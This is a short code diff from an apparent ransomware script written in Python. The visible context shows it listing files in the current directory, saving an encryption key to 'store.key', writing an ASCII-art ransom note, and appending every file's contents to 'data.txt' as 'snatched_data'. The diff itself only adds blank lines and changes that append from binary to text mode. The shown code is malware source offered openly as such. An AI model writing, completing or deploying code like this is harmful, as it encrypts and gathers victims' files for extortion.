@@ -20,6 +20,10 @@ for file in os.listdir():
 with open("store.key", "wb") as thekey:
     thekey.write(key)
 
+
+
+
+
 note = """
                                                                           ._                                            ,
                                                                             (`)..                                    ,.-')
@@ -62,7 +66,7 @@ with open("ransom_note.txt", "w") as ransom_note:
 for file in files:
     with open(file, "rb") as data_for_snatch:
         snatched_data = data_for_snatch.read()
-    with open("data.txt", "ab") as payload:
+    with open("data.txt", "a") as payload:
         payload.write(snatched_data)
 
 
